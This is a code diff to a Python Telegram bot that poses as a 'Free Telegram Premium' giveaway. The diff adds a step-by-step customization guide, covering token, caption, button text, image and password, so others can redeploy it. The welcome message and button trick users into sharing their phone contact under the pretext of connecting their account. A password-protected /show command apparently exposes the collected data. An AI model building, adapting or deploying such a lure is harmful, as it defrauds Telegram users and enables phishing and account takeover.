@@ -3,8 +3,16 @@
 #  /  \ /  \ /  _ \/  ___/\   __\   \/\/   /   |  |_/    \   __\/ __ \ / __ | 
 # /    Y    (  <_> )___ \  |  |  \        /    ^   /   |  \  | \  ___// /_/ | 
 # \____|__  /\____/____  > |__|   \__/\  /\____   ||___|  /__|  \___  >____ | 
-#         \/           \/              \/      |__|     \/          
+#         \/           \/              \/      |__|     \/          \/     \/ 
 
+"""
+CUSTOMIZATION GUIDE:
+1. Bot Token: Replace the token in main() function with your bot token from @BotFather
+2. Welcome Message: Modify WELCOME_CAPTION below to change the bot's greeting message
+3. Button Text: Change the text in KeyboardButton inside send_welcome_message() function
+4. Picture: Replace 'telegramicon.png' with your own image file (keep the same filename or update it in the code)
+5. Password: Change the 'password' variable below to set your own password for the /show command
+"""
 
 import glob
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
@@ -19,39 +27,50 @@ logger = logging.getLogger(__name__)
 user_data = {}
 
 # Password for accessing the /show command
+# CUSTOMIZE: Change this password to your desired value
 password = '4422'
 
 # Track the message IDs for deleting and resending
 message_ids = {'start': None, 'premium': None}
 
-def start(update: Update, context: CallbackContext) -> None:
-    try:
-        # Create a keyboard button to request the user's phone number
-        reply_markup = ReplyKeyboardMarkup(
-            [[KeyboardButton(text="⭐️ Get Free 3 months Telegram Premium", request_contact=True)]],
-            one_time_keyboard=True,
-            resize_keyboard=True
-        )
+# CUSTOMIZE: Modify this message to change what users see when they start the bot
+WELCOME_CAPTION = ("🎉 Welcome to Free Telegram Premium 🎉\n\n"
+                  "You can get 3 months of Telegram Premium for free!\n\n"
+                  "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
+                  "Happy Using And Keep Coming Back Every 3 Months! 😊")
 
-        # Create an inline button to trigger the "Get Premium" action
-        inline_markup = InlineKeyboardMarkup(
-            [[InlineKeyboardButton(text="🎁 Get Premium", callback_data="get_premium")]]
-        )
+def send_welcome_message(chat_id, bot=None, update=None) -> int:
+    """Helper function to send welcome message with photo and buttons"""
+    # CUSTOMIZE: Modify the button text here
+    button_text = "⭐️ Get Free 3 months Telegram Premium"
+    
+    reply_markup = ReplyKeyboardMarkup(
+        [[KeyboardButton(text=button_text, request_contact=True)]],
+        one_time_keyboard=True,
+        resize_keyboard=True
+    )
 
-        # Send welcome message with a picture and both buttons
-        with open('telegramicon.png', 'rb') as photo:
-            sent_message = update.message.reply_photo(
+    # CUSTOMIZE: Replace 'telegramicon.png' with your own image file
+    # Make sure the image file is in the same directory as this script
+    with open('telegramicon.png', 'rb') as photo:
+        if bot:
+            sent_message = bot.send_photo(
+                chat_id=chat_id,
                 photo=photo,
-                caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"
-                         "You can get 3 months of Telegram Premium for free!\n\n"
-                         "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
-                         "Happy Using And Keep Coming Back Every 3 Months! 😊"),
+                caption=WELCOME_CAPTION,
                 reply_markup=reply_markup
             )
+        else:
+            sent_message = update.message.reply_photo(
+                photo=photo,
+                caption=WELCOME_CAPTION,
+                reply_markup=reply_markup
+            )
+    return sent_message.message_id
 
-        # Assign message_id after sending the message
-        message_ids['start'] = sent_message.message_id
-
+def start(update: Update, context: CallbackContext) -> None:
+    try:
+        message_ids['start'] = send_welcome_message(update.effective_chat.id, update=update)
     except Exception as e:
         logger.error(f"An error occurred: {e}")
         update.message.reply_text("An error occurred while processing your request.")
@@ -111,28 +130,13 @@ def button(update: Update, context: CallbackContext) -> None:
         if message_ids['start']:
             context.bot.delete_message(chat_id=update.effective_chat.id, message_id=message_ids['start'])
 
-        # Re-send the original start message with the picture and buttons
-        with open('telegramicon.png', 'rb') as photo:
-            sent_message = context.bot.send_photo(
-                chat_id=update.effective_chat.id,
-                photo=photo,
-                caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"
-                         "You can get 3 months of Telegram Premium for free!\n\n"
-                         "To participate, please press the buttons below to connect your account to Telegram Pro. 📱\n\n"
-                         "Happy Using And Keep Coming Back Every 3 Months! 😊"),
-                reply_markup=ReplyKeyboardMarkup(
-                    [[KeyboardButton(text="🎁 Get Premium", request_contact=True)]],
-                    one_time_keyboard=True,
-                    resize_keyboard=True
-                )
-            )
-            message_ids['start'] = sent_message.message_id
-
+        # Re-send the welcome message
+        message_ids['start'] = send_welcome_message(update.effective_chat.id, bot=context.bot)
         message_ids['premium'] = None
 
 
 def main() -> None:
-    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
+    # CUSTOMIZE: Replace with your bot token from @BotFather
     updater = Updater("#52#####:A##############NIOWgSBsZ###xo")
 
     dispatcher = updater.dispatcher
